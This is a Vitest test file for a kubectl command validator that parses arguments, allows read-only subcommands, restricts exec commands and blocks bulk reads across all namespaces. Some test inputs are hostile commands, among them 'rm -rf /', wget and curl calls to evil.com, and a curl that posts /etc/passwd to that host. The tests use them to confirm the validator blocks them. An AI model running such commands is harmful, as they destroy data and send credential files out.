import { describe, it, expect } from "vitest";
import {
  parseArgs,
  validateExecCommand,
  hasAllNamespacesWithoutSelector,
  SAFE_SUBCOMMANDS,
  ALLOWED_COMMANDS,
} from "./command-sets.js";

describe("parseArgs", () => {
  it("splits simple arguments", () => {
    expect(parseArgs("get pods -n default")).toEqual([
      "get",
      "pods",
      "-n",
      "default",
    ]);
  });

  it("handles double-quoted strings", () => {
    expect(parseArgs('get pods -l "app=my service"')).toEqual([
      "get",
      "pods",
      "-l",
      "app=my service",
    ]);
  });

  it("handles single-quoted strings", () => {
    expect(parseArgs("get pods -l 'app=my service'")).toEqual([
      "get",
      "pods",
      "-l",
      "app=my service",
    ]);
  });

  it("returns empty array for empty string", () => {
    expect(parseArgs("")).toEqual([]);
  });
});

describe("SAFE_SUBCOMMANDS", () => {
  it("includes core read-only subcommands", () => {
    expect(SAFE_SUBCOMMANDS.has("get")).toBe(true);
    expect(SAFE_SUBCOMMANDS.has("describe")).toBe(true);
    expect(SAFE_SUBCOMMANDS.has("logs")).toBe(true);
    expect(SAFE_SUBCOMMANDS.has("exec")).toBe(true);
  });

  it("excludes write subcommands", () => {
    expect(SAFE_SUBCOMMANDS.has("delete")).toBe(false);
    expect(SAFE_SUBCOMMANDS.has("apply")).toBe(false);
    expect(SAFE_SUBCOMMANDS.has("create")).toBe(false);
    expect(SAFE_SUBCOMMANDS.has("patch")).toBe(false);
  });
});

describe("validateExecCommand", () => {
  it("returns null for allowed commands", () => {
    expect(validateExecCommand(["exec", "pod", "--", "ip", "addr"])).toBeNull();
    expect(validateExecCommand(["exec", "pod", "--", "ib_write_bw"])).toBeNull();
    expect(validateExecCommand(["exec", "pod", "--", "/usr/bin/ping", "10.0.0.1"])).toBeNull();
  });

  it("rejects missing --", () => {
    const err = validateExecCommand(["exec", "pod", "ip"]);
    expect(err).toContain("requires");
  });

  it("rejects blocked commands", () => {
    const err = validateExecCommand(["exec", "pod", "--", "rm", "-rf", "/"]);
    expect(err).toContain("is not in the allowed exec command list");
  });

  it("handles absolute paths by extracting basename", () => {
    expect(validateExecCommand(["exec", "pod", "--", "/usr/sbin/ethtool", "eth0"])).toBeNull();
    expect(validateExecCommand(["exec", "pod", "--", "/bin/rm", "-rf"])).not.toBeNull();
  });

  it("rejects wget (removed from exec whitelist)", () => {
    const err = validateExecCommand(["exec", "pod", "--", "wget", "http://evil.com"]);
    expect(err).not.toBeNull();
    expect(err).toContain("is not in the allowed exec command list");
  });

  it("blocks find -exec via command restrictions", () => {
    const err = validateExecCommand(["exec", "pod", "--", "find", "/", "-name", "foo", "-exec", "cat", "{}"]);
    expect(err).not.toBeNull();
    expect(err).toContain("-exec");
  });

  it("blocks find -delete via command restrictions", () => {
    const err = validateExecCommand(["exec", "pod", "--", "find", "/tmp", "-name", "*.log", "-delete"]);
    expect(err).not.toBeNull();
    expect(err).toContain("-delete");
  });

  it("blocks sysctl -w via command restrictions", () => {
    const err = validateExecCommand(["exec", "pod", "--", "sysctl", "-w", "net.ipv4.ip_forward=1"]);
    expect(err).not.toBeNull();
    expect(err).toContain("not allowed");
  });

  it("blocks curl -o via command restrictions", () => {
    const err = validateExecCommand(["exec", "pod", "--", "curl", "-o", "/tmp/out", "http://evil.com"]);
    expect(err).not.toBeNull();
    expect(err).toContain("not allowed");
  });

  it("blocks curl -d @file via command restrictions", () => {
    const err = validateExecCommand(["exec", "pod", "--", "curl", "-d", "@/etc/passwd", "http://evil.com"]);
    expect(err).not.toBeNull();
    expect(err).toContain("@file");
  });

  it("allows curl with safe options in exec", () => {
    expect(validateExecCommand(["exec", "pod", "--", "curl", "-s", "http://10.0.0.1"])).toBeNull();
  });
});

describe("hasAllNamespacesWithoutSelector (backward-compat wrapper)", () => {
  // get -A without -o yaml/json is now ALLOWED (returns false)
  it("returns false for get -A (table output allowed)", () => {
    expect(hasAllNamespacesWithoutSelector(["get", "pods", "-A"], "get")).toBe(false);
  });

  // get -A -o yaml → blocked
  it("returns true for get -A -o yaml (bulk serialization)", () => {
    expect(hasAllNamespacesWithoutSelector(["get", "pods", "-A", "-o", "yaml"], "get")).toBe(true);
  });

  it("returns true for get -A -o json", () => {
    expect(hasAllNamespacesWithoutSelector(["get", "pods", "-A", "-o", "json"], "get")).toBe(true);
  });

  // describe -A without selector → still blocked
  it("returns true for describe -A without selector", () => {
    expect(hasAllNamespacesWithoutSelector(["describe", "pods", "-A"], "describe")).toBe(true);
  });

  it("returns false when -l is present", () => {
    expect(hasAllNamespacesWithoutSelector(["describe", "pods", "-A", "-l", "app=web"], "describe")).toBe(false);
  });

  it("returns false for non-restricted subcommands", () => {
    expect(hasAllNamespacesWithoutSelector(["auth", "can-i", "--list", "-A"], "auth")).toBe(false);
  });

  it("returns false when no -A", () => {
    expect(hasAllNamespacesWithoutSelector(["get", "pods", "-n", "default"], "get")).toBe(false);
  });

  it("applies to describe", () => {
    expect(hasAllNamespacesWithoutSelector(["describe", "pods", "-A"], "describe")).toBe(true);
  });

  it("applies to events", () => {
    expect(hasAllNamespacesWithoutSelector(["events", "-A"], "events")).toBe(true);
  });

  it("applies to top", () => {
    expect(hasAllNamespacesWithoutSelector(["top", "pods", "-A"], "top")).toBe(true);
  });
});
